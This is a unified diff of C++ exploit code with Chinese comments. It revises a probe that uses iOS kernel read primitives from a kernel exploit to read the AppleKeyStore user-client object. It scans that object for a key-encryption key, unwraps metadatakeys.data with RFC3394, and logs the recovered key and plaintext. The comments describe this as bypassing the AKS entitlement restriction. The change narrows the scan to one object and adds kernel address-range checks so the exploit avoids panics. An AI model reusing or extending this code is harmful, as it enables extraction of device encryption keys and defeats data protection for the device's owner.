@@ -393,21 +393,21 @@ static std::string HexPrefix(const std::vector<uint8_t>& v, size_t maxBytes) {
 //    AP 内核内存。若可读到，则无需 AKS（绕开 entitlement 限制），直接自己
 //    RFC3394 解包 + AES-CBC 解密即可。
 //
-//    做法：从 AppleKeyStore 的 user client 内核对象出发，BFS 遍历其可达
-//    对象图；对每个对象按 8 字节滑动取 32 字节候选 KEK，用 RFC3394 解包
-//    metadatakeys.data。RFC3394 自带 A6A6.. 完整性校验，解包成功即为强命中
-//    （几乎不可能是巧合）。
-//    所有内核读取均以 soft-abort 包裹：读到未映射页时回滚而非终止进程。
+//    做法：读取 AppleKeyStore 的 user client 内核对象本身，按 8 字节滑动取
+//    32 字节候选 KEK，用 RFC3394 解包 metadatakeys.data。RFC3394 自带
+//    A6A6.. 完整性校验，解包成功即为强命中（几乎不可能是巧合）。
+//    安全约束：只读 task_get_ipc_port_kobject 直接返回的对象地址，不跟进
+//    对象内指针——该读原语对未映射内核地址会触发 copy_validate_kernel_addr
+//    硬 panic，soft-abort 无法挽救。
 // =====================================================================
 
-extern "C" uint64_t kread64(uint64_t kaddr);
-extern "C" uint64_t kread_ptr(uint64_t kaddr);
-extern "C" bool     is_kaddr_valid(uint64_t addr);
 extern "C" void     kreadbuf(uint64_t addr, void *buf, uint64_t len);
 extern "C" uint64_t task_self(void);
 extern "C" uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port);
 extern "C" void     kexploit_soft_abort_set(int enabled);
 extern "C" jmp_buf *kexploit_soft_abort_jmp(void);
+extern "C" uint64_t VM_MIN_KERNEL_ADDRESS;
+extern "C" uint64_t VM_MAX_KERNEL_ADDRESS;
 
 static std::string Hex64(uint64_t v) {
     char b[32];
@@ -422,9 +422,21 @@ static std::string HexBytes(const uint8_t *p, size_t n) {
     return s;
 }
 
-// soft-abort 包裹的内核读：地址无效或读到未映射页时返回 false。
+// 严格内核地址范围校验：仅当 [addr, addr+len) 完整落在内核映射范围内才放行。
+// is_kaddr_valid 只查高 20 位（过弱），会把 0xffffffa5... 这类低于真实内核下限的
+// 地址误判为合法，读取时触发 copy_validate_kernel_addr 硬 panic。
+static bool KInKernelRange(uint64_t addr, size_t len) {
+    if (VM_MAX_KERNEL_ADDRESS <= VM_MIN_KERNEL_ADDRESS) return false;  // offsets 未初始化
+    if (addr < VM_MIN_KERNEL_ADDRESS) return false;
+    if (addr + len < addr) return false;                                // 溢出
+    return (addr + len) <= VM_MAX_KERNEL_ADDRESS;
+}
+
+// soft-abort 包裹的内核读：地址越界返回 false。
+// 注意：soft-abort 只能拦截 is_kaddr_valid 失败时 early_kread 的主动 abort；
+// 对「范围内但未映射」的地址仍会触发内核 panic，因此调用方必须只读已知映射的地址。
 static bool KSafeRead(uint64_t addr, void *buf, size_t len) {
-    if (!is_kaddr_valid(addr)) return false;
+    if (!KInKernelRange(addr, len)) return false;
     if (setjmp(*kexploit_soft_abort_jmp()) != 0) {
         kexploit_soft_abort_set(0);
         return false;
@@ -479,45 +491,37 @@ static void ProbeAKSKeybag(uint64_t conn, const std::vector<uint8_t>& wrappedBlo
     uint64_t uc = task_get_ipc_port_kobject(task_self(), (mach_port_t)conn);
     Log("probe: AKS userClient kobject=" + Hex64(uc) +
         " wrappedLen=" + std::to_string(wrappedBlob.size()));
-    if (!is_kaddr_valid(uc)) { Log("probe: userClient kobject invalid, abort"); return; }
+    if (!KInKernelRange(uc, 0x100)) {
+        Log("probe: userClient kobject out of kernel range, abort");
+        return;
+    }
 
+    // 方案 A：只读 task_get_ipc_port_kobject 直接返回的 userClient 对象本身。
+    // 不跟进对象内指针（未映射地址会触发 copy_validate_kernel_addr 硬 panic，
+    // soft-abort 无法挽救）。若要扩大覆盖面需先枚举已映射区间。
     const size_t OBJ = 0x100;
-    const size_t MAX_NODES = 400;
     std::vector<uint8_t> buf(OBJ);
-    std::vector<uint64_t> queue{ uc };
-    std::vector<uint64_t> seen{ uc };
-    size_t hits = 0, scanned = 0;
+    size_t hits = 0;
 
-    for (size_t qi = 0; qi < queue.size() && scanned < MAX_NODES; ++qi) {
-        uint64_t obj = queue[qi];
-        if (!KSafeRead(obj, buf.data(), OBJ)) continue;
-        scanned++;
-        Log("probe: obj[" + std::to_string(scanned) + "] " + Hex64(obj) +
-            " = " + HexBytes(buf.data(), 0x20));
+    if (!KSafeRead(uc, buf.data(), OBJ)) {
+        Log("probe: read userClient failed, abort");
+        return;
+    }
+    Log("probe: obj " + Hex64(uc) + " = " + HexBytes(buf.data(), 0x20));
 
-        // 候选 KEK：8 字节滑动窗口取 32 字节
-        for (size_t off = 0; off + 32 <= OBJ; off += 8) {
-            auto key = AesKeyUnwrap(buf.data() + off, 32, wrappedBlob);
-            if (!key.empty()) {
-                hits++;
-                Log("probe: *** CANDIDATE KEK HIT *** obj=" + Hex64(obj) +
-                    " off=" + Hex64((uint64_t)off));
-                Log("probe:   kek=" + HexBytes(buf.data() + off, 32));
-                Log("probe:   unwrapped=" + HexBytes(key.data(), key.size()));
-            }
-        }
-
-        // 指针遍历：仅跟进对象内 8 字节对齐、且为合法内核地址的槽
-        for (size_t off = 0; off + 8 <= OBJ; off += 8) {
-            uint64_t p = kread_ptr(obj + off);
-            if (!is_kaddr_valid(p)) continue;
-            if (std::find(seen.begin(), seen.end(), p) != seen.end()) continue;
-            seen.push_back(p);
-            if (queue.size() < MAX_NODES) queue.push_back(p);
+    // 候选 KEK：8 字节滑动窗口取 32 字节
+    for (size_t off = 0; off + 32 <= OBJ; off += 8) {
+        auto key = AesKeyUnwrap(buf.data() + off, 32, wrappedBlob);
+        if (!key.empty()) {
+            hits++;
+            Log("probe: *** CANDIDATE KEK HIT *** obj=" + Hex64(uc) +
+                " off=" + Hex64((uint64_t)off));
+            Log("probe:   kek=" + HexBytes(buf.data() + off, 32));
+            Log("probe:   unwrapped=" + HexBytes(key.data(), key.size()));
         }
     }
-    Log("probe: done, nodes=" + std::to_string(scanned) +
-        " candidateHits=" + std::to_string(hits));
+
+    Log("probe: done, nodes=1 candidateHits=" + std::to_string(hits));
 }
 
 // =====================================================================
